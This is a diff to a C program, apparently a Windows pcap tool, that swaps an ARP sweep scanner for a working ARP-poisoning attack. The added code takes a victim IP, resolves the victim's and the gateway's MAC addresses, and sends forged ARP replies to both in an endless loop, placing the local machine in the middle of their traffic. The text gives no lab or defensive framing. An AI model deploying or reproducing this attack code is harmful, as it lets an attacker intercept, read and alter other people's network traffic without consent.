@@ -17,7 +17,8 @@
 
 #define SLEEP_BETWEEN_ARPS 50
 
-
+void resolveIP(char *pIPStr, unsigned char *pVictimMAC);
+int SendARPPoison(PSCANPARAMS pScanParams);
 
 /*
  * Global variables
@@ -31,6 +32,7 @@ CRITICAL_SECTION gWriteLog;
 
 /*
  * Program entry point
+ * Command line arguments : ifc-name  Victim-IP
  *
  */
 int main(int argc, char **argv)
@@ -38,18 +40,17 @@ int main(int argc, char **argv)
   DWORD lRetVal = 0;
   ARPPacket lARPPacket;
   SCANPARAMS lScanParams;
-  unsigned long lIPCounter = 0;
-  unsigned long lStartIP = 0;
-  unsigned long lStopIP = 0;
   unsigned long lDstIP = 0;
   HANDLE lThreadHandle = INVALID_HANDLE_VALUE;
   DWORD lThreadId = 0;
   int lCounter = 0;
-  pcap_if_t *lAllDevs = NULL;
   pcap_if_t *lDevice = NULL;
   char lTemp[PCAP_ERRBUF_SIZE];
+  char *lIFCName = argv[1];
 
-  HANDLE lICMPFile = INVALID_HANDLE_VALUE;
+IPAddr lVictimIPAddr;
+ULONG lVictimMACAddrLen = 6;
+/*
   char lSendData[32] = "Data Buffer";
   DWORD lReplySize = 0;
   LPVOID lReplyBuffer = NULL;
@@ -60,7 +61,7 @@ int main(int argc, char **argv)
   DWORD lARPReplyThreadID = 0;
   struct sockaddr_in lPeerIP;
   char lPeerIPStr[MAX_BUF_SIZE + 1];
-
+*/
 
   /*
    * Initialisation
@@ -68,191 +69,61 @@ int main(int argc, char **argv)
   ZeroMemory(&lScanParams, sizeof(lScanParams));
   InitializeCriticalSectionAndSpinCount(&gWriteLog, 0x00000400);
 
-  if (argc >= 4)
+  if (argc >= 3)
   {
     ZeroMemory(&lARPPacket, sizeof(lARPPacket));
+    strncpy(lScanParams.IFCString, argv[1], sizeof(lScanParams.IFCString)-1);
     GetIFCDetails(argv[1], &lScanParams);
 
-	   lStartIP = ntohl(inet_addr(argv[2]));
-	   lStopIP = ntohl(inet_addr(argv[3]));
+    /*
+     * Get victim IP address
+     */
+    lVictimIPAddr = inet_addr(argv[2]);
+    CopyMemory(lScanParams.VictimIP, &lVictimIPAddr, 4);
+    resolveIP(argv[2], lScanParams.VictimMAC);
+    
+    MAC2String(lScanParams.LocalMAC, lScanParams.LocalMACStr, MAX_MAC_LEN);
+    IP2String(lScanParams.LocalIP, lScanParams.LocalIPStr, MAX_IP_LEN);
+
+    MAC2String(lScanParams.GWMAC, lScanParams.GWMACStr, MAX_MAC_LEN);
+    IP2String(lScanParams.GWIP, lScanParams.GWIPStr, MAX_IP_LEN);
+
+    MAC2String(lScanParams.VictimMAC, lScanParams.VictimMACStr, MAX_MAC_LEN);
+    IP2String(lScanParams.VictimIP, lScanParams.VictimIPStr, MAX_IP_LEN);
+
+printf("Local  : %-15s-> %s\n", lScanParams.VictimIPStr, lScanParams.LocalMACStr);
+printf("GW     : %-15s-> %s\n", lScanParams.GWIPStr, lScanParams.GWMACStr);
+printf("Victim : %-15s-> %s\n", lScanParams.VictimIPStr, lScanParams.VictimMACStr);
+
 
     /*
-     * Start ARP Reply listener thread
+     * Open interface.
      */
-    LogMsg("main() : Starting CaptureARPReplies\n");
-    if ((lARPReplyThreadHandle = CreateThread(NULL, 0, CaptureARPReplies, &lScanParams, 0, &lARPReplyThreadID)) != NULL)
-	   {
-      if (lStartIP <= lStopIP)
-      {        
-        strncpy(lScanParams.IFCString, argv[1], sizeof(lScanParams.IFCString)-1);
+    if ((lScanParams.IfcWriteHandle = pcap_open(lIFCName, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL|PCAP_OPENFLAG_MAX_RESPONSIVENESS, 5, NULL, lTemp)) != NULL)
+    {
 
-        /*
-         * Open interface.
-         */
-        if ((lScanParams.IfcWriteHandle = pcap_open(lIFCName, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL|PCAP_OPENFLAG_MAX_RESPONSIVENESS, 5, NULL, lTemp)) != NULL)
-        {
-          for (lIPCounter = lStartIP; lIPCounter <= lStopIP; lIPCounter++)
-          {
-            if (memcmp(lScanParams.LocalIP, &lIPCounter, BIN_IP_LEN) &&
-                memcmp(lScanParams.GWIP, &lIPCounter, BIN_IP_LEN))
-            {
-              /*
-               * Send WhoHas ARP request and sleep ...
-               */
-              SendARPWhoHas(&lScanParams, lIPCounter);
-
-              lPeerIP.sin_addr.s_addr = htonl(lIPCounter);
-              strncpy(lPeerIPStr, inet_ntoa(lPeerIP.sin_addr), sizeof(lPeerIPStr)-1);
-
-              LogMsg("Ping %s", lPeerIPStr);
-              Sleep(SLEEP_BETWEEN_ARPS);
-            } // if (memcmp...
-          } // for (; lStartI...
-
-
-
-          /*
-           * Wait for all ARP replies and terminate thread.
-           */
-          Sleep(2000);
-          TerminateThread(lARPReplyThreadHandle, 0);
-          CloseHandle(lARPReplyThreadHandle);
-
-
-          if (lScanParams.IfcWriteHandle)
-            pcap_close((pcap_t *) lScanParams.IfcWriteHandle);
-
-        } // if ((lIFCHandle...
-        else
-          LogMsg("main() : pcap_open() failed\n");
-
-      } 
-      else 
+      while (1)
       {
-        LogMsg("main() : Something is wrong with the start and/or end IP!\n");
-        lRetVal = 1;
-      } // if (lStart...
-   	} // if ((lPOISO...
+        printf("Victim (%s) <--- Local (%s) ---> GW (%s)\n", lScanParams.VictimIPStr, lScanParams.LocalIPStr, lScanParams.GWIPStr);
+        SendARPPoison(&lScanParams);
+//        SendARPPoison(&lScanParams, lSysList[lCounter].lSysMAC, lSysList[lCounter].lSysIPBin);
+        Sleep(3000);
+      }
+
+      if (lScanParams.IfcWriteHandle)
+        pcap_close((pcap_t *) lScanParams.IfcWriteHandle);
+
+    } // if ((lIFCHandle...
+    else
+      LogMsg("main() : pcap_open() failed\n");
+
   } // if (argc >= 4)...
 
-  DeleteCriticalSection(&gWriteLog);
-
   return(lRetVal);
 }
 
 
 
-/*
- *
- *
- */
-DWORD WINAPI CaptureARPReplies(LPVOID pScanParams)
-{
-  pcap_t *lIFCHandle = NULL;
-  char lTemp[1024];
-  char lFilter[1024];
-  bpf_u_int32 lNetMask;
-  struct bpf_program lFCode;
-  int lPcapRetVal = 0;
-  PETHDR lEHdr = NULL;
-  PARPHDR lARPHdr = NULL;
-  u_char *lPktData = NULL;
-  struct pcap_pkthdr *lPktHdr = NULL;
-  PSCANPARAMS lScanParams = (PSCANPARAMS) pScanParams;
-  unsigned char lEthDstStr[MAX_MAC_LEN+1];
-  unsigned char lEthSrcStr[MAX_MAC_LEN+1];
-  unsigned char lARPEthDstStr[MAX_MAC_LEN+1];
-  unsigned char lARPEthSrcStr[MAX_MAC_LEN+1];
-  unsigned char lARPIPDstStr[MAX_IP_LEN+1];
-  unsigned char lARPIPSrcStr[MAX_IP_LEN+1];
-
-
-  if ((lIFCHandle = pcap_open((char *) lScanParams->IFCString, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1, NULL, lTemp)) != NULL)
-  {
-    ZeroMemory(&lFCode, sizeof(lFCode));
-    ZeroMemory(lFilter, sizeof(lFilter));
-
-    _snprintf(lFilter, sizeof(lFilter) - 1, "arp");
-    lNetMask = 0xffffff; // "255.255.255.0"
-
-    // Compile the filter
-    if(pcap_compile(lIFCHandle, &lFCode, (const char *) lFilter, 1, lNetMask) >= 0)
-    {
-      // Set the filter
-      if(pcap_setfilter(lIFCHandle, &lFCode) >= 0)
-      {
-        while ((lPcapRetVal = pcap_next_ex(lIFCHandle,  &lPktHdr, (const u_char **) &lPktData)) >= 0)
-        {
-          if (lPcapRetVal == 1)      
-          {
-            lEHdr = (PETHDR) lPktData;
-            lARPHdr = (PARPHDR) (lPktData + sizeof(ETHDR));
-              
-            ZeroMemory(lEthDstStr, sizeof(lEthDstStr));
-            ZeroMemory(lEthSrcStr, sizeof(lEthSrcStr));
-            ZeroMemory(lARPEthSrcStr, sizeof(lARPEthSrcStr));
-            ZeroMemory(lARPEthDstStr, sizeof(lARPEthDstStr));
-            ZeroMemory(lARPIPDstStr, sizeof(lARPIPDstStr));
-            ZeroMemory(lARPIPSrcStr, sizeof(lARPIPSrcStr));
-
-            MAC2String(lEHdr->ether_shost, lEthSrcStr, sizeof(lEthSrcStr)-1);
-            MAC2String(lEHdr->ether_dhost,  lEthDstStr, sizeof(lEthDstStr)-1);
-            MAC2String(lARPHdr->sha,  lARPEthSrcStr, sizeof(lARPEthSrcStr)-1);
-            MAC2String(lARPHdr->tha,  lARPEthDstStr, sizeof(lARPEthDstStr)-1);
-
-            IP2String(lARPHdr->tpa, lARPIPDstStr, sizeof(lARPIPDstStr)-1);
-            IP2String(lARPHdr->spa, lARPIPSrcStr, sizeof(lARPIPSrcStr)-1);
-            
-            if (ntohs(lARPHdr->oper) == ARP_REPLY)
-            {
-              ZeroMemory(lTemp, sizeof(lTemp));
-              snprintf(lTemp, sizeof(lTemp)-1, "\n  Operation: %s (%d)\n  MAC : %s -> %s\n  ARP : %s -> %s\n  IP  : %s -> %s\n", (ntohs(lARPHdr->oper) == ARP_REQUEST)? "ARP Request" : "ARP Reply", lARPHdr->oper, lEthSrcStr, lEthDstStr, lARPEthSrcStr, lARPEthDstStr, lARPIPSrcStr, lARPIPDstStr);
-              LogMsg(lTemp);
-            }
-          }
-        }
-      }
-    }
-  }
-
-  return(0);
-}
-
-
-/*
- * Ethr:	LocalMAC -> 255:255:255:255:255:255
- * ARP :	LocMAC/LocIP -> 0:0:0:0:0:0/VicIP
- *
- */
-int SendARPWhoHas(PSCANPARAMS pScanParams, unsigned long lIPAddress)
-{
-  int lRetVal = OK;
-  unsigned long lDstIP = 0;
-  ARPPacket lARPPacket;  
-  int i = 0;
-
-  lDstIP = htonl(lIPAddress);
-  lARPPacket.lReqType = ARP_REQUEST;
-
-  // Set src/dst MAC values
-  CopyMemory(lARPPacket.Eth_SrcMAC, pScanParams->LocalMAC, BIN_MAC_LEN);
-  memset(lARPPacket.Eth_DstMAC, 255, sizeof(lARPPacket.Eth_DstMAC));
-
-
-  // Set ARP request values
-  CopyMemory(lARPPacket.ARP_LocalMAC, pScanParams->LocalMAC, BIN_MAC_LEN);
-  CopyMemory(lARPPacket.ARP_LocalIP, pScanParams->LocalIP, BIN_IP_LEN);
-  CopyMemory(&lARPPacket.ARP_DstIP[0], &lDstIP, BIN_IP_LEN);
-
-  // Send packet
-  if (SendARPPacket((pcap_t *) pScanParams->IfcWriteHandle, &lARPPacket) != 0)
-  {
-    LogMsg("SendARPWhoHas() : Unable to send ARP packet.\n");
-    lRetVal = NOK;
-  } // if (SendARPPacket(lIF...
-
-  return(lRetVal);
-}
 
 
 
@@ -324,6 +195,7 @@ void IP2String(unsigned char pIP[BIN_IP_LEN], unsigned char *pOutput, int pOutpu
   if (pOutput && pOutputLen > 0)
     snprintf((char *) pOutput, pOutputLen, "%d.%d.%d.%d", pIP[0], pIP[1], pIP[2], pIP[3]);
 }
+
 
 
 
@@ -420,6 +292,9 @@ END:
 }
 
 
+
+
+
 /*
  *
  *
@@ -463,4 +338,99 @@ void LogMsg(char *pMsg, ...)
   printf(lLogMsg);
   
   LeaveCriticalSection(&gWriteLog);
+}
+
+
+
+/*
+ *
+ *
+ */
+void resolveIP(char *pIPStr, unsigned char *pVictimMAC)
+{
+  unsigned long lVictimIPAddr = 0;
+  ULONG lVictimMACAddrLen = BIN_MAC_LEN;
+
+  if (pIPStr != NULL)
+  {
+    // Get victim IP address
+    lVictimIPAddr = inet_addr(pIPStr);
+    SendARP(lVictimIPAddr, 0, pVictimMAC, &lVictimMACAddrLen);
+  } // if (pIPStr != ...
+}
+
+
+
+/*
+ * Ethr:	LocalMAC -> VicMAC
+ * ARP :	LocMAC/GW-IP -> VicMAC/VicIP
+ *
+ */
+int SendARPPoison(PSCANPARAMS pScanParams)
+{
+  int lRetVal = OK;
+  ARPPacket lARPPacket;
+
+  if (pScanParams != NULL && pScanParams->IfcWriteHandle != NULL)
+  {
+    if (memcmp(pScanParams->VictimMAC, pScanParams->GWMAC, BIN_MAC_LEN) != 0)
+    {
+      printf("Victim (%s) <--- Local (%s) ---> GW (%s)\n", pScanParams->VictimIPStr, pScanParams->LocalIPStr, pScanParams->GWIPStr);
+
+      /*
+       * Poisoning from A to B.
+       */
+      ZeroMemory(&lARPPacket, sizeof(lARPPacket));
+	 
+      lARPPacket.lReqType = ARP_REPLY;
+      // Set MAC values
+      CopyMemory(lARPPacket.Eth_SrcMAC, pScanParams->LocalMAC, BIN_MAC_LEN);
+      CopyMemory(lARPPacket.Eth_DstMAC, pScanParams->VictimMAC, BIN_MAC_LEN);
+
+      // Set ARP reply values
+      CopyMemory(lARPPacket.ARP_LocalMAC, pScanParams->LocalMAC, BIN_MAC_LEN);
+      CopyMemory(lARPPacket.ARP_LocalIP, pScanParams->GWIP, BIN_IP_LEN);
+
+      CopyMemory(lARPPacket.ARP_Dst_MAC, pScanParams->VictimMAC, BIN_MAC_LEN);
+      CopyMemory(lARPPacket.ARP_DstIP, pScanParams->VictimIP, BIN_IP_LEN);
+//printf("Poison(1) %s/%s    %s/%s -> %s/%s\n", lLocalMAC, lVicMAC, lLocalMAC, lGWIP, lVicMAC, lVicIP);
+
+
+      // Send packet
+      if (SendARPPacket((pcap_t *) pScanParams->IfcWriteHandle, &lARPPacket) != 0)
+      {
+        LogMsg("SendARPPoison() : Unable to send ARP packet.");
+        lRetVal = NOK;
+      } // if (SendARPPacket(lIF...
+
+
+      /*
+       * Poisoning from B to A.
+       */
+
+      ZeroMemory(&lARPPacket, sizeof(lARPPacket));
+
+      lARPPacket.lReqType = ARP_REPLY;
+      // Set MAC values
+      CopyMemory(lARPPacket.Eth_SrcMAC, pScanParams->LocalMAC, BIN_MAC_LEN);
+      CopyMemory(lARPPacket.Eth_DstMAC, pScanParams->GWMAC, BIN_MAC_LEN);
+
+      // Set ARP reply values
+      CopyMemory(lARPPacket.ARP_LocalMAC, pScanParams->LocalMAC, BIN_MAC_LEN);
+      CopyMemory(lARPPacket.ARP_LocalIP, pScanParams->VictimIP, BIN_IP_LEN);
+
+      CopyMemory(lARPPacket.ARP_Dst_MAC, pScanParams->GWMAC, BIN_MAC_LEN);
+      CopyMemory(lARPPacket.ARP_DstIP, pScanParams->GWIP, BIN_IP_LEN);
+
+      // Send packet
+      if (SendARPPacket((pcap_t *) pScanParams->IfcWriteHandle, &lARPPacket) != 0)
+      {
+        LogMsg("SendARPPoison() : Unable to send ARP packet.");
+        lRetVal = NOK;
+      } // if (SendARPPacket(lIF...
+    } // if (memcmp(pVictimM...
+  } // if (pScanParams != NULL && pScanP
+
+
+  return(lRetVal);
 }
